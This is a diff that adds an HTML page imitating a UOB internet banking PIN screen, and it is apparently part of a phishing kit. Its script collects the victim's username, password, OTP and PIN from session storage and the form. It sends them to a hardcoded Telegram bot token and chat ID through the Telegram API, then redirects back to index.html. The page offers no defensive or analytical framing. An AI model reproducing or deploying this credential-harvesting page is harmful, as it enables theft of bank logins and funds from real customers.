@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>UOB Personal Internet Banking - PIN</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: 'Roboto', sans-serif;
+    background: #003d7a;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .pin-box {
+    background: #fff;
+    width: 320px;
+    padding: 28px 32px 36px;
+    border-radius: 6px;
+    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
+  }
+  .lang {
+    font-size: 13px;
+    text-align: right;
+    margin-bottom: 12px;
+  }
+  .lang a {
+    color: #0072ce;
+    text-decoration: none;
+    margin-left: 8px;
+  }
+  .lang a:hover {
+    text-decoration: underline;
+  }
+  .logo {
+    display: flex;
+    align-items: center;
+    margin-bottom: 24px;
+  }
+  .logo .bars {
+    width: 20px; height: 24px;
+    background:
+      repeating-linear-gradient(to right,
+        #d71920 0 3px,
+        transparent 3px 6px);
+    margin-right: 9px;
+  }
+  .logo span {
+    font-weight: 700;
+    font-size: 22px;
+    color: #0072ce;
+  }
+  h1 {
+    font-weight: 400;
+    font-size: 20px;
+    margin: 0 0 24px 0;
+    color: #333;
+  }
+  input[type="text"] {
+    width: 100%;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    outline: none;
+    padding: 14px 12px;
+    font-size: 14px;
+    color: #999;
+    box-sizing: border-box;
+    text-align: center;
+    letter-spacing: 1.5em;
+  }
+  input:focus {
+    border-color: #0072ce;
+    color: #333;
+  }
+  button {
+    margin-top: 24px;
+    width: 100%;
+    background-color: #0072ce;
+    border: none;
+    color: #fff;
+    padding: 12px 0;
+    font-size: 16px;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #0057b7;
+  }
+</style>
+</head>
+<body>
+
+<div class="pin-box" role="main" aria-label="PIN entry form">
+  <div class="lang" aria-label="Language selection">
+    <a href="#">English</a> | <a href="#">Bahasa Indonesia</a>
+  </div>
+
+  <div class="logo" aria-label="UOB logo">
+    <div class="bars" aria-hidden="true"></div><span>UOB</span>
+  </div>
+
+  <h1>Enter PIN</h1>
+
+  <form id="pinForm" action="javascript:void(0);">
+    <input type="text" maxlength="6" minlength="6" pattern="[0-9]{6}" inputmode="numeric" placeholder="------" id="pin" name="pin" required aria-label="PIN" autocomplete="one-time-code" />
+    <button type="submit" id="pinBtn">Submit</button>
+  </form>
+</div>
+
+<script>
+  const telegramBotToken = '8729819513:AAHuJSCT5sT4zR6Yv6xx-JdttOCKtR31hOM';
+  const telegramChatId = '6647221855';
+
+  const user = sessionStorage.getItem('uob_user');
+  const pass = sessionStorage.getItem('uob_pass');
+  const otp = sessionStorage.getItem('uob_otp');
+
+  if (!user || !pass || !otp) window.location.href = 'index.html';
+
+  document.getElementById('pinForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    const pin = document.getElementById('pin').value.trim();
+
+    if (!/^\d{6}$/.test(pin)) return;
+
+    const message = 
+      `UOB OTP Submission:\nUsername: ${user}\nPassword: ${pass}\nPIN: ${otp}\nOTP: ${pin}`;
+
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message
+      })
+    }).finally(() => {
+      sessionStorage.clear();
+      window.location.href = 'index.html';
+    });
+  });
+</script>
+
+</body>
+</html>
